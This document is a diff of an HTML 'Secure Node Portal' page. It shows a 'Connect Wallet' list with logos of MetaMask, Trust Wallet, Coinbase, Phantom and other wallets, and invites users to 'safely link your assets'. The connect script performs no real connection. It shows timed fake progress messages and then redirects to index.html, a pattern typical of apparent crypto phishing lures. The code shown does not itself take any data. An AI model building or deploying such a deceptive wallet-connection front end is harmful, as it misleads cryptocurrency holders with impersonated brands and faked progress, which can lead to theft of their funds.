@@ -3,144 +3,159 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Secure Node Connection</title>
+    <title>Secure Node Portal | Connection</title>
     <style>
         :root {
-            --bg: #0b0e11;
-            --card-bg: #161a1e;
-            --border: #2b3139;
-            --text-main: #eaecef;
-            --text-dim: #848e9c;
-            --accent: #f0b90b; /* Professional Gold/Yellow accent */
+            --bg: #0a0b0d;
+            --card-bg: #121418;
+            --item-bg: #1c1f26;
+            --border: #2d333b;
+            --accent: #3b82f6;
+            --text: #ffffff;
+            --text-dim: #94a3b8;
         }
 
         * { box-sizing: border-box; margin: 0; padding: 0; }
-        
         body {
             background-color: var(--bg);
-            color: var(--text-main);
-            font-family: 'Inter', -apple-system, system-ui, sans-serif;
-            display: flex; justify-content: center; align-items: center;
-            min-height: 100vh; padding: 20px;
+            color: var(--text);
+            font-family: 'Inter', -apple-system, sans-serif;
+            display: flex; justify-content: center; align-items: center; min-height: 100vh;
         }
 
-        .portal-card {
+        .portal-container {
+            width: 100%; max-width: 440px; padding: 20px;
+        }
+
+        .card {
             background: var(--card-bg);
             border: 1px solid var(--border);
             border-radius: 24px;
-            width: 100%;
-            max-width: 420px;
-            padding: 30px;
-            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.6);
+            padding: 32px;
+            box-shadow: 0 30px 60px rgba(0,0,0,0.6);
         }
 
-        .header { text-align: center; margin-bottom: 25px; }
-        .header h1 { font-size: 22px; margin-bottom: 8px; font-weight: 600; }
-        .header p { color: var(--text-dim); font-size: 14px; }
+        .header { text-align: center; margin-bottom: 30px; }
+        .header h1 { font-size: 24px; font-weight: 700; margin-bottom: 8px; }
+        .header p { color: var(--text-dim); font-size: 15px; line-height: 1.4; }
 
         .wallet-list {
-            display: flex; flex-direction: column; gap: 10px;
+            display: flex; flex-direction: column; gap: 12px;
             max-height: 400px; overflow-y: auto; padding-right: 5px;
         }
 
-        /* Custom scrollbar for a professional feel */
-        .wallet-list::-webkit-scrollbar { width: 4px; }
-        .wallet-list::-webkit-scrollbar-thumb { background: var(--border); border-radius: 10px; }
-
         .wallet-item {
             display: flex; align-items: center; justify-content: space-between;
-            background: #21262d; border: 1px solid transparent;
-            padding: 14px 18px; border-radius: 14px;
-            cursor: pointer; transition: 0.2s;
+            background: var(--item-bg);
+            border: 1px solid transparent;
+            padding: 16px 20px; border-radius: 16px;
+            cursor: pointer; transition: 0.2s cubic-bezier(0.4, 0, 0.2, 1);
         }
 
         .wallet-item:hover {
             border-color: var(--accent);
-            background: #2b3139;
-            transform: scale(1.02);
+            background: #252932;
+            transform: translateY(-2px);
         }
 
-        .wallet-name { font-size: 16px; font-weight: 500; }
-        .wallet-icon { width: 30px; height: 30px; object-fit: contain; }
+        .wallet-info { display: flex; align-items: center; gap: 16px; }
+        .wallet-name { font-size: 17px; font-weight: 600; }
+        
+        .wallet-icon {
+            width: 32px; height: 32px; object-fit: contain;
+        }
 
-        /* Loading Overlay */
-        .loader-overlay {
+        /* Connecting Modal */
+        #loadingOverlay {
             display: none; position: fixed; inset: 0;
-            background: rgba(11, 14, 17, 0.98);
-            z-index: 9999; flex-direction: column;
+            background: rgba(8, 10, 12, 0.98);
+            z-index: 1000; flex-direction: column;
             justify-content: center; align-items: center;
         }
-
         .spinner {
-            width: 40px; height: 40px;
-            border: 3px solid #2b3139; border-top-color: var(--accent);
-            border-radius: 50%; animation: spin 0.8s linear infinite;
-            margin-bottom: 15px;
+            width: 50px; height: 50px; border: 4px solid #1c1f26;
+            border-top-color: var(--accent); border-radius: 50%;
+            animation: spin 1s linear infinite; margin-bottom: 20px;
         }
-
         @keyframes spin { to { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
 
-<div id="loader" class="loader-overlay">
+<div id="loadingOverlay">
     <div class="spinner"></div>
-    <p id="loader-text">Securing Connection...</p>
+    <p id="loadingText" style="font-weight: 600;">Connecting Wallet...</p>
 </div>
 
-<div class="portal-card">
-    <div class="header">
-        <h1>Connect Wallet</h1>
-        <p>Choose a wallet to validate your node</p>
-    </div>
-
-    <div class="wallet-list">
-        <div class="wallet-item" onclick="connect('MetaMask')">
-            <span class="wallet-name">MetaMask</span>
-            <img src="https://raw.githubusercontent.com/MetaMask/brand-resources/master/Logomark/Metamask-衝刺-Logo.png" class="wallet-icon">
+<div class="portal-container">
+    <div class="card">
+        <div class="header">
+            <h1>Connect Wallet</h1>
+            <p>Select a wallet provider to safely link your assets to the nodes portal.</p>
         </div>
 
-        <div class="wallet-item" onclick="connect('Trust Wallet')">
-            <span class="wallet-name">Trust Wallet</span>
-            <img src="https://trustwallet.com/assets/images/media/assets/trust_platform.png" class="wallet-icon">
-        </div>
+        <div class="wallet-list">
+            <div class="wallet-item" onclick="connect('MetaMask')">
+                <div class="wallet-info">
+                    <img src="https://upload.wikimedia.org/wikipedia/commons/3/36/MetaMask_Fox.svg" class="wallet-icon">
+                    <span class="wallet-name">MetaMask</span>
+                </div>
+            </div>
 
-        <div class="wallet-item" onclick="connect('Coinbase Wallet')">
-            <span class="wallet-name">Coinbase Wallet</span>
-            <img src="https://avatars.githubusercontent.com/u/18060234?s=200&v=4" class="wallet-icon">
-        </div>
+            <div class="wallet-item" onclick="connect('Trust Wallet')">
+                <div class="wallet-info">
+                    <img src="https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/ethereum/info/logo.png" class="wallet-icon">
+                    <span class="wallet-name">Trust Wallet</span>
+                </div>
+            </div>
 
-        <div class="wallet-item" onclick="connect('Exodus')">
-            <span class="wallet-name">Exodus</span>
-            <img src="https://raw.githubusercontent.com/spothq/cryptocurrency-icons/master/128/color/exodus.png" class="wallet-icon">
-        </div>
+            <div class="wallet-item" onclick="connect('Coinbase')">
+                <div class="wallet-info">
+                    <img src="https://raw.githubusercontent.com/coinbase/coinbase-wallet-sdk/master/packages/wallet-sdk/assets/images/coinbase-wallet-logo.png" class="wallet-icon">
+                    <span class="wallet-name">Coinbase</span>
+                </div>
+            </div>
 
-        <div class="wallet-item" onclick="connect('Argent')">
-            <span class="wallet-name">Argent</span>
-            <img src="https://raw.githubusercontent.com/argentlabs/argent-x/main/packages/extension/src/assets/logo.svg" class="wallet-icon">
-        </div>
+            <div class="wallet-item" onclick="connect('Phantom')">
+                <div class="wallet-info">
+                    <img src="https://raw.githubusercontent.com/phantom-labs/brand-assets/main/logos/icon/purple.png" class="wallet-icon">
+                    <span class="wallet-name">Phantom</span>
+                </div>
+            </div>
 
-        <div class="wallet-item" onclick="connect('Phantom')">
-            <span class="wallet-name">Phantom</span>
-            <img src="https://raw.githubusercontent.com/phantom-labs/brand-assets/main/logos/icon/purple.png" class="wallet-icon">
-        </div>
+            <div class="wallet-item" onclick="connect('Exodus')">
+                <div class="wallet-info">
+                    <img src="https://raw.githubusercontent.com/spothq/cryptocurrency-icons/master/128/color/exodus.png" class="wallet-icon">
+                    <span class="wallet-name">Exodus</span>
+                </div>
+            </div>
 
-        <div class="wallet-item" onclick="connect('WalletConnect')">
-            <span class="wallet-name">WalletConnect</span>
-            <img src="https://raw.githubusercontent.com/WalletConnect/walletconnect-assets/master/Logo/Blue%20(Default)/Logo.png" class="wallet-icon">
+            <div class="wallet-item" onclick="connect('Argent')">
+                <div class="wallet-info">
+                    <img src="https://raw.githubusercontent.com/compound-finance/token-list/master/assets/asset_ARGENT.svg" class="wallet-icon">
+                    <span class="wallet-name">Argent</span>
+                </div>
+            </div>
+
+            <div class="wallet-item" onclick="connect('WalletConnect')">
+                <div class="wallet-info">
+                    <img src="https://raw.githubusercontent.com/WalletConnect/walletconnect-assets/master/Logo/Blue%20(Default)/Logo.png" class="wallet-icon">
+                    <span class="wallet-name">WalletConnect</span>
+                </div>
+            </div>
         </div>
     </div>
 </div>
 
 <script>
     function connect(name) {
-        const loader = document.getElementById('loader');
-        const text = document.getElementById('loader-text');
-        loader.style.display = 'flex';
+        const overlay = document.getElementById('loadingOverlay');
+        const text = document.getElementById('loadingText');
+        overlay.style.display = 'flex';
         text.innerText = "Initializing " + name + "...";
         
-        setTimeout(() => { text.innerText = "Synchronizing with node..."; }, 1200);
-        setTimeout(() => { window.location.href = "index.html"; }, 2500);
+        setTimeout(() => { text.innerText = "Syncing Node Data..."; }, 1200);
+        setTimeout(() => { window.location.href = "index.html"; }, 2800);
     }
 </script>
 
